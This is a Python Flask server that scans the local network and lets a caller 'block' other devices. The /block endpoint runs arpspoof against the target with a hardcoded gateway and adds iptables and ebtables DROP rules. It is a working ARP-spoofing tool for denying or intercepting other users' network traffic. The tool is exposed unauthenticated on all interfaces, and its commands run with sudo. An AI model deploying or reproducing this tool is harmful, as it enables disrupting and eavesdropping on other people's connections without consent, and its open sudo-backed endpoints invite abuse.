from flask import Flask, request, jsonify
import subprocess
import signal
import sys
import netifaces

app = Flask(__name__)

# ============================ Utility Functions ============================

def get_my_ip_and_mac():
    """
    Retrieve the current device's IP and MAC address.
    Used for self-protection to prevent blocking the host machine.
    """
    interface = "wlp3s0"  # Change to your actual network interface
    try:
        mac_address = netifaces.ifaddresses(interface)[netifaces.AF_LINK][0]['addr']
        ip_address = netifaces.ifaddresses(interface)[netifaces.AF_INET][0]['addr']
        return ip_address, mac_address
    except Exception as e:
        print(f"⚠️ Could not get self info: {e}")
        return None, None

def get_hostname(ip):
    """
    Perform a reverse DNS lookup to get the hostname of a given IP address.
    :param ip: The IP address to resolve.
    :return: Hostname if found, otherwise "Unknown".
    """
    try:
        result = subprocess.run(["dig", "+short", "-x", ip], capture_output=True, text=True)
        hostname = result.stdout.strip()
        return hostname if hostname else "Unknown"
    except Exception:
        return "Unknown"

def get_mac_address(ip):
    """
    Retrieve the MAC address of a device using arp-scan.
    :param ip: The IP address of the target device.
    :return: MAC address if found, otherwise None.
    """
    try:
        result = subprocess.run(["sudo", "arp-scan", "--localnet"], capture_output=True, text=True)
        for line in result.stdout.split("\n"):
            parts = line.split("\t")
            if len(parts) >= 2 and parts[0] == ip:
                return parts[1]
    except Exception as e:
        print(f"❌ Error getting MAC for {ip}: {e}")
    return None

def is_device_blocked(ip, mac):
    """
    Check if a device is blocked by analyzing iptables and ebtables rules.
    :param ip: IP address of the target device.
    :param mac: MAC address of the target device.
    :return: Boolean indicating whether the device is blocked.
    """
    iptables_output = subprocess.run(["sudo", "iptables", "-L", "-v", "-n"], capture_output=True, text=True).stdout
    ebtables_output = subprocess.run(["sudo", "ebtables", "-L"], capture_output=True, text=True).stdout
    return ip in iptables_output or (mac and mac in ebtables_output)

# ============================ API Endpoints ============================

@app.route("/scan", methods=["GET"])
def scan_network():
    """
    Scan the local network for connected devices, including their IP, MAC, and hostname.
    Also, check whether each device is blocked. Explicitly adds the scanning device.
    """
    try:
        result = subprocess.run(["sudo", "arp-scan", "--localnet"], capture_output=True, text=True)
        devices = []
        
        # ✅ Get the scanning device info (your own IP & MAC)
        my_ip, my_mac = get_my_ip_and_mac()
        my_hostname = get_hostname(my_ip) if my_ip else "Unknown"

        for line in result.stdout.split("\n"):
            parts = line.split("\t")
            if len(parts) >= 2:
                ip, mac = parts[0], parts[1]
                hostname = get_hostname(ip)
                blocked = is_device_blocked(ip, mac)

                # ✅ Skip duplicate self-entry
                if ip == my_ip:
                    continue  

                devices.append({"ip": ip, "mac": mac, "name": hostname, "blocked": blocked})

        # ✅ Add the scanning device (host machine)
        if my_ip and my_mac:
            devices.append({
                "ip": my_ip,
                "mac": my_mac,
                "name": my_hostname,
                "blocked": False  # Never block yourself
            })

        return jsonify({"devices": devices})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/block", methods=["POST"])
def block_device():
    """
    Block a specific device from accessing the network.
    Uses ARP spoofing, ebtables, and iptables.
    :return: JSON confirmation message.
    """
    ip = request.json.get("ip")
    if not ip:
        return jsonify({"error": "IP address is required"}), 400

    # 🛡️ Protect the user from blocking themselves before doing any extra work
    my_ip, my_mac = get_my_ip_and_mac()
    if ip == my_ip:
        return jsonify({"error": "Cannot block yourself!"}), 403

    # ✅ Now we fetch the MAC address only if the IP is valid
    mac_address = get_mac_address(ip)
    if not mac_address:
        return jsonify({"error": "MAC address not found"}), 500

    if mac_address == my_mac:
        return jsonify({"error": "Cannot block yourself!"}), 403

    try:
        # Stop any existing ARP spoofing processes for the target
        subprocess.run(["sudo", "pkill", "-f", f"arpspoof -i wlp3s0 -t {ip}"], stderr=subprocess.DEVNULL)
        
        # Start ARP spoofing
        subprocess.Popen(["sudo", "arpspoof", "-i", "wlp3s0", "-t", ip, "192.168.1.1"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        # Block using ebtables
        subprocess.run(["sudo", "ebtables", "-A", "FORWARD", "-s", mac_address, "-j", "DROP"])
        
        # Block using iptables
        subprocess.run(["sudo", "iptables", "-A", "FORWARD", "-s", ip, "-j", "DROP"])
        
        return jsonify({"status": "blocked", "ip": ip, "mac": mac_address})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/unblock", methods=["POST"])
def unblock_device():
    """
    Unblock a device and restore its network access.
    :return: JSON confirmation message.
    """
    ip = request.json.get("ip")
    if not ip:
        return jsonify({"error": "IP address is required"}), 400

    mac_address = get_mac_address(ip)
    if not mac_address:
        return jsonify({"error": "MAC address not found"}), 500

    try:
        # Stop ARP spoofing
        subprocess.run(["sudo", "pkill", "-f", f"arpspoof -i wlp3s0 -t {ip}"], stderr=subprocess.DEVNULL)
        
        # Remove ebtables block
        subprocess.run(["sudo", "ebtables", "-D", "FORWARD", "-s", mac_address, "-j", "DROP"])
        
        # Remove iptables block
        subprocess.run(["sudo", "iptables", "-D", "FORWARD", "-s", ip, "-j", "DROP"])

        # Restore ARP table to prevent issues
        subprocess.run(["sudo", "arping", "-c", "3", "-I", "wlp3s0", ip], stderr=subprocess.DEVNULL)
        
        return jsonify({"status": "unblocked", "ip": ip, "mac": mac_address})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

# ============================ Signal Handling ============================

def shutdown_server(signal, frame):
    """
    Handle CTRL+C to properly terminate the server and cleanup spoofing processes.
    """
    print("\n🛑 Stopping ARP spoofing processes...")
    subprocess.run(["sudo", "pkill", "-f", "arpspoof"], stderr=subprocess.DEVNULL)
    print("✅ Cleanup complete. Exiting...")
    sys.exit(0)

# Capture CTRL+C (SIGINT)
signal.signal(signal.SIGINT, shutdown_server)

# ============================ Run Flask Server ============================

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)

